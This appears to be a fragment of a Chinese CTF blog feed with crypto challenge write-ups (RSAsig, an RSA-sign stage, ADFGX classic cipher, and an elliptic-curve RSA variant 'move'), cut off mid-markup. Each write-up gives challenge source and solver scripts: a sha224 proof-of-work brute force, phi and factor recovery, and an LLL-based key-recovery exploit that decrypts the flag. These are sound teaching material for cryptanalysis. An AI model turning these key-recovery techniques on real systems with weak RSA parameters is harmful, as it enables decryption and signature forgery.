<h2 id="RSAsig"><a href="#RSAsig" class="headerlink" title="RSAsig"></a>RSAsig</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> Crypto.Util.number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> proof_of_work <span class="keyword">import</span> proof_of_work</span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string"> ____                             ____  _                   _</span></span><br><span class="line"><span class="string">/ ___|  ___  ___ _   _ _ __ ___  / ___|(_) __ _ _ __   __ _| |_ _   _ _ __ ___</span></span><br><span class="line"><span class="string">\___ \ / _ \/ __| | | | '__/ _ \ \___ \| |/ _` | '_ \ / _` | __| | | | '__/ _ \</span></span><br><span class="line"><span class="string"> ___) |  __/ (__| |_| | | |  __/  ___) | | (_| | | | | (_| | |_| |_| | | |  __/</span></span><br><span class="line"><span class="string">|____/ \___|\___|\__,_|_|  \___| |____/|_|\__, |_| |_|\__,_|\__|\__,_|_|  \___|</span></span><br><span class="line"><span class="string">                                          |___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dosend</span>(<span class="params">m</span>):</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dorecv</span>():</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>():</span></span><br><span class="line">    random_generator = Random.new().read</span><br><span class="line">    rsa = RSA.generate(<span class="number">1024</span>, random_generator)</span><br><span class="line">    private_pem = rsa</span><br><span class="line">    <span class="keyword">return</span> private_pem</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    rsakey = gen()</span><br><span class="line">    a = RSA._RSAobj(<span class="literal">None</span>, rsakey)</span><br><span class="line">    modBits = Crypto.Util.number.size(rsakey.n)</span><br><span class="line">    k = ceil_div(modBits,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        dosend(<span class="string">"Welcome to this secure cryptosystem:"</span>)</span><br><span class="line">        dosend(<span class="string">"1.Get flag.\n2.Have my signature.\n3.Exit.\n4.Get my key."</span>)</span><br><span class="line">        dosend(<span class="string">"What is your choice?"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            option = <span class="built_in">int</span>(dorecv().strip())</span><br><span class="line">            <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">                cipher = rsakey.encrypt(flag, k)</span><br><span class="line">                dosend(b64encode(cipher[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">                dosend(<span class="string">"What message to sign?"</span>)</span><br><span class="line">                m = <span class="built_in">int</span>(dorecv().strip())</span><br><span class="line">                sign = a.sign(m, k)</span><br><span class="line">                dosend(<span class="built_in">str</span>(sign[<span class="number">0</span>][<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">                dosend(<span class="string">"Bye~"</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">4</span>:</span><br><span class="line">                dosend(<span class="built_in">str</span>(rsakey.n))</span><br><span class="line">                dosend(<span class="built_in">str</span>(rsakey.e))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dosend(<span class="string">"Invalid choice!"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit()</span><br><span class="line"><span class="comment">#if  proof_of_work():</span></span><br><span class="line"><span class="comment">#    exit()</span></span><br><span class="line"><span class="comment">#signal.alarm(20)</span></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>第一关为sha224爆破。基操，直接贴exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):	</span><br><span class="line">			message = <span class="string">'{0}{1}{2}Vw3UrFafQ94N5k4QB'</span>.<span class="built_in">format</span>(str1[i],str1[j],str1[k])</span><br><span class="line">			<span class="comment">#print(message)</span></span><br><span class="line">			m = hashlib.sha224()</span><br><span class="line">			m.update(message.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">			c = m.hexdigest()</span><br><span class="line">			<span class="keyword">if</span> c == <span class="string">'6da53efa50c3ef1481cc0f403212262dd1bcead74d9f0b34f306318c'</span>:</span><br><span class="line">				<span class="built_in">print</span> (message)</span><br><span class="line">				<span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>爆破前3位字符，然后进下一关。</p>
<p>疑似非预期了，昨天早上复现到一半，机器被关了，连不上了。根据VN的wp和大佬的指点，可以想象到解法步骤：</p>
<p>点1拿到base64，将base64转为十进制数，拿到2里签名。签名出来直接转byte就是flag。</p>
<p><del>人麻了，人麻了。人麻了？人麻了！</del></p>
<h2 id="random（第一关RSA部分）"><a href="#random（第一关RSA部分）" class="headerlink" title="random（第一关RSA部分）"></a>random（第一关RSA部分）</h2><p>第一关都没过，还没做到LCG。</p>
<h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><h4 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsa_sign:pow(m,d,p)</span><br><span class="line">e*d+n:3563329754048976946603729466426236052000141166700839903323255268203185709020494450173369806214666850943076188175778667508946270492708397447950521732324059148390232744011000065982865974194986726739638097566303135573072114448615095262066554751858952042395375417151593676621825939069783767865138657768553767717034970</span><br><span class="line">e*d-n:3563121718917234588723786463275555826875232380691165919033718924958406353810813480184744219046717838078497090403751007254545187720107602959381881715875898243474504999760208133192572812110967142474619366650504948619637909653723376917174456091396220576841259798792078769198369072982063716206690589554604992470787752</span><br><span class="line">tmp = e*d</span><br><span class="line">please sign the message with p:you_can_get_more_message</span><br><span class="line">please enter sign:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h4><p>先简单的二元一次方程解出<code>n</code>和<code>e*d</code>的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(bin(tmp))-2=1039</span><br><span class="line">len(bin(n))-2=1024</span><br></pre></td></tr></table></figure>
<p>可以发现，两者差了15位。</p>
<script type="math/tex; mode=display">
\because \,\,e\,\,\cdot \,\,d\,\,\equiv \,\,1\left( mod\,\,\varphi \left( n \right) \right) 
\\
\therefore \,\,e\,\,\cdot \,\,d\,\,-1 =\,\,k\,\,\cdot \,\,\varphi \left( n \right) \,\,, k\in N
\\
\because \,\,k\,\,=\,\,\frac{\left( e\,\,\cdot \,\,d\,\,-\,\,1 \right)}{\varphi \left( n \right)}
\\
\therefore \,\,k\,\,\in \,\,\left[ 2^{15},2^{16} \right]</script><p>写一个脚本爆破phi的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi=[]  <span class="comment">#11个</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">if</span> ((tmp-<span class="number">1</span>) // i) * i != tmp-<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		phi.append((tmp-<span class="number">1</span>) // i)	</span><br></pre></td></tr></table></figure>
<p>可以得到有11个可能的phi值。</p>
<p>随后用z3爆破，得到p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	s.add(x*y==n)</span><br><span class="line">	s.add(x+y==n-phi[i]+<span class="number">1</span>)</span><br><span class="line">	s.add(x&gt;<span class="number">0</span>)</span><br><span class="line">	s.add(y&gt;<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> s.check()!=sat:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(phi[i])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'x='</span>,s.model()[x])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'y='</span>,s.model()[y])</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">10980405508174271259925333166343579553719061316941945190323939083665489902286168861229664589365210026388298173482496757264697996404794685064674668272479771</span></span><br><span class="line">q = <span class="number">9473016801951797771267846445459738473973421588058140695253031511700407533935872397264731631901174665159278878658035094231228063878480145556088206641042779</span></span><br><span class="line">phi=<span class="number">104017565871178939971501575340112562454393004836992144768171622389677604840484994312793583974506432289548886013830127200541386300397244284320008224080452437410449815269897363953401430206474104816882552899007591140131802079961736224008071736969511510673117632180401571196581547933965545949203486211512709601060</span></span><br><span class="line"><span class="comment">#k=34256</span></span><br></pre></td></tr></table></figure>
<p>然后的操作比较复杂，先素数分解tmp，得到因子</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531610237-c911a761-78e2-4bfd-b151-1e21558fe511.png" alt="image-20210526080806673"></p>
<p>279位显然是可以忽略的，然后用以下代码判断e的因子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=[<span class="number">3</span>,<span class="number">47</span>,<span class="number">97</span>,<span class="number">157</span>,<span class="number">1601</span>,<span class="number">21851</span>,<span class="number">56277292709098311733</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	<span class="keyword">if</span> tmp // e[i] == inverse(e[i],phi):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'e='</span>,e[i])</span><br><span class="line"><span class="comment">#因子为：56277292709098311733</span></span><br></pre></td></tr></table></figure>
<p>判断完因子后，使其互乘得到所有可能的e。代码来源于Wankko Ree大佬，用的算法类似于DFS。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">3</span>,<span class="number">47</span>,<span class="number">97</span>,<span class="number">157</span>,<span class="number">1601</span>,<span class="number">21851</span>]</span><br><span class="line">b = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">p, t</span>):</span></span><br><span class="line">    b.add(t)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="built_in">len</span>(a):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    go(p+<span class="number">1</span>, t*a[p])</span><br><span class="line">    go(p+<span class="number">1</span>, t)</span><br><span class="line"></span><br><span class="line">go(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">list</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">	c[i]*=<span class="number">56277292709098311733</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>解出来后，需要爆破所有可能的e，总数量为</p>
<script type="math/tex; mode=display">
C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script><p>应该是很好理解的，然后pq的值不确定，同样需要爆破。由于需要用到pwn的remote模块，而我完全不会。同时靶机也在第二天关闭，未能完整复现。根据已有WP，e的值应该是<code>5627729270909831173 * 3 * 21851</code>，然后根据题目要求sign：<code>pow(m,d,p)</code>签名。</p>
<p>后半部分LCG未能复现。</p>
<h3 id="参考链接：-2"><a href="#参考链接：-2" class="headerlink" title="参考链接："></a>参考链接：</h3><p>WP参考VN战队wp，中间的递归求e来自于Wankko Ree大佬。</p>
]]></content>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛密码部分wp</title>
    <url>/2021/05/19/%E5%9B%BD%E8%B5%9B%E5%AF%86%E7%A0%81%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="国赛密码部分wp"><a href="#国赛密码部分wp" class="headerlink" title="国赛密码部分wp"></a>国赛密码部分wp</h1><p>这次国赛只做出两道密码，很丢人，便在赛后将能力范围内的赛题简单复现一下。</p>
<span id="more"></span>
<h2 id="一卷：classic"><a href="#一卷：classic" class="headerlink" title="一卷：classic"></a>一卷：classic</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>很明显的ADFGX加密，且不给密钥和关键字，也没有hint。<del>显然，出题人希望密码手们能在8小时内自主研发出量子计算机来攻克这题。</del></p>
<p>复现过程：</p>
<p>使用以下网址</p>
<p><img src="https://i.loli.net/2021/05/19/b2tc7NLp6P3kArV.png" alt="image-20210519130756056"></p>
<p>密钥使用以下公开密码表：PHQGMEAYNOFDXKRCVSZWBUTIL</p>
<p>关键字key清空，就能得到一串啥都看不懂的东西：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MMYOBFYSBHKOSOXYMOXXIIPBCDOXOXOOOOSYMRPOPCINBBFLXBYKPOOMYYOBLOEPPFBPKCKKBOBYCOYYCSNMKMNEOXXESHIO</span><br></pre></td></tr></table></figure>
<p>没想到吧，然后要进行栅栏密码</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531535764-ecfdd67d-2e36-4075-bb74-94b9319121f3.png" alt="image-20210519131121813"></p>
<p>然后还要凯撒</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531541674-b7d4d21c-a53d-4bcc-b057-839fe1ce886b.png" alt="image-20210519131157761"></p>
<p>终于发现了有一段CISCN字样。将里面的英语翻译一下，即可得到flag</p>
<h3 id="本题总结："><a href="#本题总结：" class="headerlink" title="本题总结："></a>本题总结：</h3><p>比赛时完全没有做出来，时间都花在爆破密钥、猜关键字、<del>寻觅量子计算机和祈祷图灵转世上了</del>。</p>
<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://blog.csdn.net/weixin_43540515/article/details/113122845">1.4 ADFGX原理</a></p>
<p>睡不醒的某某车赛后wp</p>
<h2 id="二卷：move"><a href="#二卷：move" class="headerlink" title="二卷：move"></a>二卷：move</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>output.txt:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>虎符2021 simultaneous原题简化版</p>
<p>直接上exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"> </span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"><span class="comment"># M = Matrix(ZZ, [[2**512, e],</span></span><br><span class="line"><span class="comment">#                 [0, -n]])</span></span><br><span class="line"><span class="comment"># GV = M.LLL()[0]</span></span><br><span class="line">GV = (-<span class="number">352349739892292322999330613117511489276791137416050590322561272098135764509812116210543232353192946492907441641899508311181782397967869533800138447935440769558784357373166666205853969428654899524304252899588626355058283586558885888</span>, -<span class="number">406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409</span>)</span><br><span class="line">x = -GV[<span class="number">0</span>] &gt;&gt; <span class="number">512</span></span><br><span class="line">y = (e*x+GV[<span class="number">1</span>])//n</span><br><span class="line">k = e*x-n*y</span><br><span class="line">K = k//y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor</span>(<span class="params">K, N</span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">518</span>):</span><br><span class="line">        s = (l+r)//<span class="number">2</span></span><br><span class="line">        v = s*s - (<span class="number">9</span>*s**<span class="number">2</span>*(K-<span class="number">1</span>-s)**<span class="number">2</span>//(<span class="built_in">round</span>(N**<span class="number">0.25</span>)**<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span>*N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">S = factor(K, n)</span><br><span class="line">d = inverse(e, n+<span class="number">1</span>+S)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(long_to_bytes(i) <span class="keyword">for</span> i <span class="keyword">in</span> mul(d, c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 商业转载请联系作者获得授权，非商业转载请注明出处。</span></span><br><span class="line"><span class="comment"># For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.</span></span><br><span class="line"><span class="comment"># 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)</span></span><br><span class="line"><span class="comment"># 